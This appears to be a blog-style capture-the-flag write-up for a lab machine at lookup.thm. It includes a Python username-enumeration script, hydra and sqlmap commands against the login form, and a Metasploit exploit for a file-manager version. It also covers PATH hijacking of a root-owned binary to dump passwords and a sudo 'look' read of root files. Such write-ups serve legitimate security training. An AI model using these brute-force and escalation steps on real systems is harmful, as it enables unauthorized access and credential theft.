Hello and welcome :D This CTF is about web enumeration, analysing outputs, lots of brute-forcing, python scripting, using msfconsole for a meterpreter shell, horizontal and vertical privilege escalation.

80/tcp open http Apache httpd 2.4.41 ((Ubuntu))  
| http-methods:   
|_ Supported Methods: GET HEAD POST OPTIONS  
|_http-title: Login Page  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Could not resolve our IP, need to add a hosts entry:

![](https://miro.medium.com/v2/resize:fit:875/1*oqJXs4eM79SJJxzE1YKYAA.png)

sudo vim /etc/hosts

add the target IP with the wepage name displayed in the URL.

![](https://miro.medium.com/v2/resize:fit:569/1*LkoNIP20tkOO2ryVs4MEYA.png)

Resolved the page and we are greeted by a login screen. Lets start enumerating.

![](https://miro.medium.com/v2/resize:fit:875/1*sa23u24FcY2MOa6IqaaFlg.png)

Upon entering any wrong credentials, one will be redirected and the page is reloading:

![](https://miro.medium.com/v2/resize:fit:875/1*DEWT3b9pf0-vtB8SImOAug.png)

My dirsearch did not discover any further directories, so the login panel is the only thing we will be working with for now.

![](https://miro.medium.com/v2/resize:fit:588/1*R9OxspQEzuctI1H3YVBh0g.png)

dirsearch — url http://10.10.217.93

Because of this Redirection in the login page, it makes the whole process of finding an injection way much harder and time consuming. Still will be running my SQLmap in the background.

![](https://miro.medium.com/v2/resize:fit:736/1*WMG38fIWId4rTV4Mja_Dog.png)

r.txt is the saved login request from burp.

  
sqlmap -r r.txt — risk 3 — level 5 — threads 10 — batch — dbs — dump

Nothing helped, so I was a bit stuck here.

I attempted manuel enumeration with the username of “admin” and got another error message back.

![](https://miro.medium.com/v2/resize:fit:875/1*oxVS9L26OyMEeEKlpxB1Kw.png)

This means, that we can create a python script which goes through a list of usernames to find some other passwords that would also work as login credentials.

With the help of chatgpt, I created the following python script to support us with this task:

import requests   
   
# Define the target URL   
url = “http://lookup.thm/login.php"   
   
# Define the file path containing usernames   
file_path = “/usr/share/seclists/Usernames/Names/names.txt”   
   
# Read the file and process each line   
try:   
with open(file_path, “r”) as file:   
for line in file:   
username = line.strip()   
if not username:   
continue # Skip empty lines   
   
# Prepare the POST data   
data = {   
“username”: username,   
“password”: “password” # Fixed password for testing   
}   
   
# Send the POST request   
response = requests.post(url, data=data)   
   
# Check the response content   
if “Wrong password” in response.text:   
print(f”Username found: {username}”)   
elif “wrong username” in response.text:   
continue # Silent continuation for wrong usernames   
except FileNotFoundError:   
print(f”Error: The file {file_path} does not exist.”)   
except requests.RequestException as e:   
print(f”Error: An HTTP request error occurred: {e}”)

It worked, we found another account called “jose”.

![](https://miro.medium.com/v2/resize:fit:381/1*KodFSLlqthe0pKU_6rh7gA.png)

Our only way now to login is by brute-forcing. Lets give it a shot for both found usernames with the following hydra command:

hydra -l NAME -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form “/login.php:username=NAME&password=^PASS^:Wrong password”

WE WERE SUCCESSFUL!! Found the password for JOSE :D

![](https://miro.medium.com/v2/resize:fit:748/1*Sw9kBPMNKK8Ip64JUrWvog.png)

Lets login and continue!

Redirected to a new subdomain! Lets add it to our /etc/hosts dataset

![](https://miro.medium.com/v2/resize:fit:875/1*51XfQJ0Ykb0zA-BgiN_Ifg.png)

![](https://miro.medium.com/v2/resize:fit:875/1*VD1HHwbwEhlP9slC7LR_eg.png)

Found more Credentials in credentials.txt:

![](https://miro.medium.com/v2/resize:fit:875/1*ZK-Fb6jPRoGTboVICoviTQ.png)

think:nopassword

Tried several things, but these credentials do not seem to work anything.

After some enumeration, we found the version of the application:

![](https://miro.medium.com/v2/resize:fit:829/1*Z8xsgZSehvVOJFxk-5R7SQ.png)

![](https://miro.medium.com/v2/resize:fit:875/1*72qFxXXKL0Db-2rllivqnA.png)

Found **Version 2.1.47.**

Quick search on the searchsploit database:

![](https://miro.medium.com/v2/resize:fit:714/1*GjuAqdKjh1N-S-SFVESoJg.png)

I have wasted so much time already, its time to get a quick W with metasploit :D

![](https://miro.medium.com/v2/resize:fit:743/1*Guhk55GQ2PHJNL8rIC1uwQ.png)

Use the following Module and fill in the remaining options before running:

Finally we are **www-data**.

![](https://miro.medium.com/v2/resize:fit:746/1*xyGS-5dbDRWCwXmOWZks8Q.png)

Unfortunately not able to retrieve the flag yet:

![](https://miro.medium.com/v2/resize:fit:551/1*ItI7bNXXZJyp1YtazvbjpQ.png)

Lets enumerate the session:

find / -perm /4000 2>/dev/null

![](https://miro.medium.com/v2/resize:fit:469/1*qBpB5-YoqvZlrecr-MxeZQ.png)

The “pwm” executable caught my eye because its not installed on Linux by default.

This simple script is run by root and executes the command ID, which will be filled in /home/<ID>/.passwords and will extract passwords for us.

![](https://miro.medium.com/v2/resize:fit:723/1*cpUBcqf4eY9x9KrzYmcpOQ.png)

Lets try to trick it into us thinking being think :D

![](https://miro.medium.com/v2/resize:fit:680/1*JMvpNpyOUd-jPNtLcALwnw.png)

we will add the tmp folder to our current PATH.

Afterwords, create your own ID command in the /tmp folder and execute the pwm script in there in order to get the .passwords dataset from the user think.

We will just put these results in a .txt file and try to brute-force the ssh-login.

![](https://miro.medium.com/v2/resize:fit:739/1*YzCilVxP4plNIew15vf50g.png)

Worked perfectly!

![](https://miro.medium.com/v2/resize:fit:824/1*zGXDhhMjKFY6Pi2LV7rFag.png)

Finally able to retrieve our first Flag:

![](https://miro.medium.com/v2/resize:fit:751/1*-cQ8pL05TsAVdlVzECkzNg.png)

Upon typing “sudo -l” we can see that we are able to use the look command as sudo.

Explanation and Usage of the command by [GTFOBins](https://gtfobins.github.io/gtfobins/look/):

![](https://miro.medium.com/v2/resize:fit:875/1*8K1WCm5TzPX5_PVDP6T3hA.png)

I just assumed that the file in root is called root.txt like in user “user.txt” and lookup the file.

We get our last flag! Now head over to your next target!! x)